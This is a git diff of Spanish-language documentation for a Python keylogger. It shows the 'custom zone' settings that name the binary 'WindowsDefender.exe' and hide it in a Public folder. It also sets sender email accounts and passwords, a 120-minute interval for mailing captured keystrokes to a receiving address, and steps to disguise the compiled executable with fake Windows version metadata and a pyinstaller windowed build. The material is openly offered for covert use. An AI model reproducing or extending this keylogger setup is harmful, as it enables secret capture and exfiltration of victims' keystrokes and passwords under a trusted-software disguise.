@@ -1,35 +1,55 @@
 [Volver al a la documentación](../README.md)
 
-# Custom __[Developer Junior]__
+# Custom __[Solo para programadores intemedio de python]__
 
+Proceso de Opciones avanzada del keylogger.
+
+__NOTA:__ Si no sabe no toque.
 ````py
-# ****************************************   ZONA CUSTOM   *********************************
+# ***************************************   ZONA CUSTOM AVANZADA  ***********************************
+
+# NOTA:| Solo Cambie éstas variables si sabe      |
+#      | lo que está haciendo, en caso contrario  |
+#      | el Keylogger no funcionará correctamente |
+
 def GetNameKey():                   # Retorna el nombre del Keylogger compilado *.EXE
     return "WindowsDefender.exe"    # este archivo debe tener el mismo nombre "WindowsDefender.py"  
-def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger y log.txt
+def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger
     return "C:\\Users\\Public\\Security\\Windows Defender\\"
-def LogName():  # Nombre del log (Registro de teclas)
-    return ".key"
+def logKeyPath():   # Ruta del registro de teclas.
+    # Ruta donde se guardará temporalmente el Registro de teclas
+    return "C:\\Users\\Public\\Security\\Settings\\"
+def LogName():  # Es el nombre que tendrá el registro de teclas.
+    return "reg.k"             # <= Opcional, cambie de nombre al archivo 
 def FilePath():
-    return str(GetPathOcult()+GetPathOcult())
+    return GetPathOcult()+GetNameKey()  # <No cambiar>
+
+# ************************************  FIN ZONA CUSTOM AVANZADA   *********************************
+
+####################################################################################################
+
+# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
 # Correo de envío [Primaria] 
 def emailP():                   # <<== Cambia éste correo
-    return "Send123@gmail.com" 
+    return "correo1@gmail.com" 
 def passP():                    # <<== Contraseña del correo
-    return "contraseña1"
+    return "contra1"
 # Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
 def emailS():                   # <<== Cambia éste correo
-    return "Sendabc@gmail.com"
-def emailP():                   # <<== Contraseña del correo 
-    return "contraseña2"
+    return "correo2@gmail.com"
+def passS():                   # <<== Contraseña del correo 
+    return "pass2"
 
-#Correos que recibirán los archivos log
+def timeSend(): # Tiempo de envío perzonalizado
+    return 120 #Minutos                 <= Escoja su tiempo en minutos
+
+#Correos que recibirán el registro de teclas.
 def ReceiveE():
     #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
-    return ["Recibe1@gmail.com"]                                                # MonoCorreo
+    return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
+# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
-# *****************************************   FIN ZONA CUSTOM   *******************************
 ````
 
 
@@ -42,12 +62,12 @@ Se utilizará `pyinstaller`
     Si el siguiente proceso se realiza con exito, el keylogger estará disfrazado así como las siguientes imagenes.
     
 
-    ![Imagen1](https://i.imgur.com/4ytoK3h.png)
-    ![Imagen2](https://i.imgur.com/1Dj2Tat.png)
+    ![Imagen1](https://i.imgur.com/MQAiVnJ.png)
+    ![Imagen2](https://i.imgur.com/mTBByRy.png)
 
     Toda esa información puede ser modificada en el archivo de la plantilla `version.txt`
 2. __Disfraz _[Información]_:__ El el siguiente archivo `version.txt`, puedes modificar la información del `*.exe` la cual se supone que de ser creible.
-```` t
+````r
 VSVersionInfo(
   ffi=FixedFileInfo(
     filevers=(6, 1, 7601, 17514),
@@ -86,6 +106,6 @@ Mediante Consola debe dirigirse a la carpeta principal.
 Los requisitos es tener instalada la librería `pyinstaller`, porfavor mire un tutorial antes de hacer éste proceso, la linea de comando recomendada es la siguiente:
 
 
-    ````r
-    pyinstaller --clean   --distpath "EXE" -F --windowed --icon icon.ico --version-file version.txt "Tu nombre custom".py
-    ````
+````bat
+pyinstaller --clean   --distpath "EXE" -F --windowed --icon icon.ico --version-file version.txt "Tu nombre custom".py
+````
